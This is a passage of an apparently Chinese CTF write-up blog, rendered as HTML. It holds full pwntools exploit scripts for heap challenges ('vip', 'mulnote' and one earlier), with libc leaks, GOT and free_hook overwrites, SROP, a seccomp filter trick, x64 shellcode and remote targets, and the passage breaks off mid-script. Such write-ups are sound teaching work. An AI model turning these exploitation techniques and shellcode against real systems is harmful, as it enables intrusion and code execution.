class="number">2</span>,<span class="number">0x100</span>)<span class="comment">#</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x100</span>)<span class="comment">#</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x2f0</span>+p64(<span class="number">0x300</span>)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'A'</span>*<span class="number">0xf8</span>+<span class="string">'\x00\n'</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x120</span><span class="number">-8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x330</span><span class="number">-8</span><span class="number">-0x20</span>)</span><br><span class="line"><span class="comment">#delete(3)</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x21</span>)*<span class="number">0x1b</span>+p64(<span class="number">0x231</span>)+p64(<span class="number">0</span>)+<span class="string">'\xe8\x27'</span>+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">debug()</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x21</span>)*<span class="number">0x1b</span>+p64(<span class="number">0x231</span>)+p64(<span class="number">0</span>)+<span class="string">'\xe8\x27'</span>+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x230</span><span class="number">-8</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0xf8</span>+p64(<span class="number">0xf1</span>)+<span class="string">'\x20\x26\xdd\n'</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0xf8</span>+p64(<span class="number">0xf1</span>)+<span class="string">'\xcf\x15\n'</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0xf1</span>)*<span class="number">6</span>+<span class="string">'A'</span>*(<span class="number">0x61</span><span class="number">-32</span><span class="number">-48</span>)+p64(<span class="number">0xfbad1800</span>)+<span class="string">'A'</span>*<span class="number">24</span>+<span class="string">'\x00\n'</span>)</span><br><span class="line">a.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">a.recvuntil(<span class="string">"\x7f"</span>)</span><br><span class="line">libc_base=u64(a.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]<span class="number">-131</span></span><br><span class="line"><span class="comment">#print hex(libc_base)</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">__malloc_hook=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">__realloc_hook=__malloc_hook<span class="number">-8</span></span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">success(<span class="string">"__malloc_hook ==&gt; 0x%x"</span>%__malloc_hook)</span><br><span class="line">fake_chunk=<span class="number">0x7ffff7dd196f</span><span class="number">-0x7ffff7a0d000</span>+libc_base</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0xf1</span>)*<span class="number">6</span>+<span class="string">'A'</span>*(<span class="number">0x61</span><span class="number">-32</span><span class="number">-48</span>)+p64(<span class="number">0xfbad2887</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">stdout=libc_base+libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0xf8</span>+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x7ffff7dd26db</span><span class="number">-0x7ffff7a0d000</span>+libc_base)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0xd</span>+p64(<span class="number">0x7ffff7dd06e0</span><span class="number">-0x7ffff7a0d000</span>+libc_base)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1d</span>,<span class="string">'\x00'</span>)+p64(stdout)</span><br><span class="line">payload=payload.ljust(<span class="number">0xf0</span><span class="number">-8</span><span class="number">-8</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0xf1</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"1 : "</span>+hex(<span class="number">0x7ffff7dd27d3</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0xf8</span>+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x7ffff7dd27c3</span><span class="number">-0x7ffff7a0d000</span>+libc_base)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0xd</span>+p64(<span class="number">0x7ffff7dd06e0</span><span class="number">-0x7ffff7a0d000</span>+libc_base)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1d</span>,<span class="string">'\x00'</span>)+p64(stdout)</span><br><span class="line">payload=payload.ljust(<span class="number">0xf0</span><span class="number">-8</span><span class="number">-8</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0xf1</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"1 : "</span>+hex(<span class="number">0x7ffff7dd28b3</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0xf8</span>+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x7ffff7dd28ab</span><span class="number">-0x7ffff7a0d000</span>+libc_base)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line">payload=<span class="string">'\x00'</span>*<span class="number">0xd</span>+p64(<span class="number">0x7ffff7dd06e0</span><span class="number">-0x7ffff7a0d000</span>+libc_base)</span><br><span class="line">payload=payload.ljust(<span class="number">0x1d</span>,<span class="string">'\x00'</span>)+p64(stdout)</span><br><span class="line">payload=payload.ljust(<span class="number">0xf0</span><span class="number">-8</span><span class="number">-8</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0xf1</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"1 : "</span>+hex(<span class="number">0x7ffff7dd299b</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0xf8</span>+p64(<span class="number">0xf1</span>)+p64(<span class="number">0x7ffff7dd28ab</span><span class="number">-0x7ffff7a0d000</span>+libc_base+i*<span class="number">0xe8</span>)+<span class="string">'\n'</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line">    <span class="comment">#debug()</span></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0xf0</span><span class="number">-8</span>)</span><br><span class="line">    payload=<span class="string">'\x00'</span>*<span class="number">0xd</span>+p64(<span class="number">0x7ffff7dd06e0</span><span class="number">-0x7ffff7a0d000</span>+libc_base)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x1d</span>,<span class="string">'\x00'</span>)+p64(stdout)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xf0</span><span class="number">-8</span><span class="number">-8</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0xf1</span>)</span><br><span class="line">    edit(<span class="number">4</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"1 : "</span>+hex(<span class="number">0x7ffff7dd299b</span>+i*<span class="number">0xe8</span>)</span><br><span class="line">__free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">new_execve_env=(__free_hook)&amp;<span class="number">0xfffffffffffff000</span></span><br><span class="line">shellcode1 = <span class="string">'''</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, %d</span></span><br><span class="line"><span class="string">mov edx, 0x1000</span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">'''</span> % new_execve_env</span><br><span class="line">payload=<span class="string">"/bin/sh\x00"</span>+<span class="string">'\x00'</span>*(<span class="number">0x6d</span><span class="number">-8</span>)+p64(libc_base+libc.symbols[<span class="string">"setcontext"</span>]+<span class="number">53</span>)</span><br><span class="line">payload+=p64(__free_hook+<span class="number">16</span>)+asm(shellcode1)</span><br><span class="line"><span class="comment">#edit(4,"/bin/sh\x00"+'\x00'*(0x6d-8)+p64(libc_base+libc.symbols["setcontext"])+'\n')</span></span><br><span class="line">edit(<span class="number">4</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment"># 设置寄存器</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = __free_hook + <span class="number">8</span></span><br><span class="line">frame.rip = libc_base + libc.symbols[<span class="string">'mprotect'</span>] <span class="comment"># 0xa8 rcx</span></span><br><span class="line">frame.rdi = new_execve_env</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">0</span>,str(frame)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line">shellcode_x64 = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">a.sendline(shellcode_x64)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h4 id="vip"><a href="#vip" class="headerlink" title="vip:"></a>vip:</h4><h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析:"></a>程序分析:</h5><p>edit函数这里存在明显的溢出，但是在flag为0的情况下无法任意读取用户输入的内容:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssize_t __fastcall my_read(void *a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int fd; <span class="regexp">//</span> [rsp+<span class="number">1</span>Ch] [rbp-<span class="number">4</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">    return read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == -<span class="number">1</span> )</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">  return read(fd, a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>become_vip函数这里，可以自定义沙盒:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0</span>x50uLL);</span><br><span class="line">  printf(<span class="string">"Hello, %s\n"</span>, &amp;buf);</span><br><span class="line">  v1 = <span class="number">11</span>;</span><br><span class="line">  v2 = &amp;v4;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1</span>LL, <span class="number">0</span>LL, <span class="number">0</span>LL, <span class="number">0</span>LL, *(_QWORD *)&amp;v1, &amp;v4) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"prctl(PR_SET_NO_NEW_PRIVS)"</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2</span>LL, &amp;v1) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"prctl(PR_SET_SECCOMP)"</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(<span class="number">0</span>x28u) ^ v92;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ex师傅提供的文章<br>定义沙盒参考了这篇文章:<br><a href="https://xz.aliyun.com/t/3431" target="_blank" rel="noopener">X-NUCA’2018 线上专题赛 secretcenter 解题思路</a></p><p>程序这里想要任意读取，需要open的返回值为0，那么定义的沙盒可以是：如果系统调用是open，则返回error(0),这样后面read的时候，fd就是0了，即从终端读取输入.<br>但是后来开启shell的时候会导致shell无法正常打开libc.so,后来在沙盒中增加判断，如果open的参数filename的地址为 “/dev/urandom”的地址，则返回error(0),其他时候正常使用。</p><p>定义的沙盒如下:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">A = sys_number</span><br><span class="line">A == 0x101 ? next : allow</span><br><span class="line">A = args[1] </span><br><span class="line">A == 0x40207e ? dead : allow</span><br><span class="line"><span class="section">allow:</span></span><br><span class="line">return ALLOW</span><br><span class="line"><span class="section">dead:</span></span><br><span class="line">return ERRNO(0)</span><br></pre></td></tr></table></figure></p><h5 id="完整的exp如下-1"><a href="#完整的exp如下-1" class="headerlink" title="完整的exp如下:"></a>完整的exp如下:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">exec_file=<span class="string">"./vip"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line">argv=[<span class="string">"seccomp-tools"</span>,<span class="string">"dump"</span>,<span class="string">"./vip"</span>]</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    <span class="comment">#a=process(argv=argv)</span></span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">"112.126.103.14"</span>,<span class="number">9999</span>)</span><br><span class="line">    libc=ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#text_base,libc_base=get_base(a)</span></span><br><span class="line">    <span class="comment">#script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'</span></span><br><span class="line">    script=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x0000000004013D9</span></span><br><span class="line"><span class="string">    b *0x00000000004014EB</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"hoice: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Index: "</span>,str(idx))</span><br><span class="line">    a.sendlineafter(<span class="string">"Size: "</span>,str(size))</span><br><span class="line">    a.sendafter(<span class="string">"tent: "</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule</span><span class="params">(code,jt ,jf ,k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p16(code) + p8(jt) + p8(jf) + p32(k) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rule</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>) </span><br><span class="line">    payload+= rule(<span class="number">0x15</span> ,<span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00000101</span>)</span><br><span class="line">    payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000018</span>)</span><br><span class="line">    payload+= rule(<span class="number">0x15</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0040207e</span>)</span><br><span class="line">    payload+= rule(<span class="number">0x06</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7fff0000</span>) </span><br><span class="line">    payload+= rule(<span class="number">0x06</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00050000</span>) </span><br><span class="line">    <span class="keyword">return</span> payload </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vip</span><span class="params">(name)</span>:</span></span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line">    a.sendafter(<span class="string">"\n"</span>,name)</span><br><span class="line">vip(<span class="string">'A'</span>*<span class="number">0x20</span>+build_rule())</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x58</span>+p64(<span class="number">0x51</span>)+p64(<span class="number">0x000000000404100</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">free_got=elf.got[<span class="string">"free"</span>]</span><br><span class="line">payload=p64(free_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">4</span>,len(payload),payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">"free"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">8</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h4 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote:"></a>mulnote:</h4><h5 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h5><p>代码被混淆过，对一个彩币逆向功底的人来说有些头疼，第二天慢慢逆了会，加上动调知道了程序的功能.</p><p>漏洞出在remove函数这里,开启了一个新线程用来free chunk，存在条件竞争:<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void *__fastcall start_routine(void *<span class="built_in">a1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  free((void *)ptr_array[(_QWORD)<span class="built_in">a1</span>])<span class="comment">;</span></span><br><span class="line">  sleep(<span class="number">10</span>u)<span class="comment">;</span></span><br><span class="line">  ptr_array[(_QWORD)<span class="built_in">a1</span>] = <span class="number">0</span>LL<span class="comment">;</span></span><br><span class="line">  return <span class="number">0</span>LL<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>free过后睡了10秒再进行指针清0，切换到主线程，这时指针没有清0，直接当做UAF做就可以了。</p><h5 id="完整的exp如下-2"><a href="#完整的exp如下-2" class="headerlink" title="完整的exp如下:"></a>完整的exp如下:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">exec_file=<span class="string">"./mulnote"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">"112.126.101.96"</span>,<span class="number">9999</span>)</span><br><span class="line">    libc=ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000D52)</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000012F0)</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000FB5)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"&gt;"</span>,idx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    menu(<span class="string">'C'</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"size&gt;"</span>,str(size))</span><br><span class="line">    a.sendafter(<span class="string">"&gt;"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="string">'R'</span>)</span><br><span class="line">    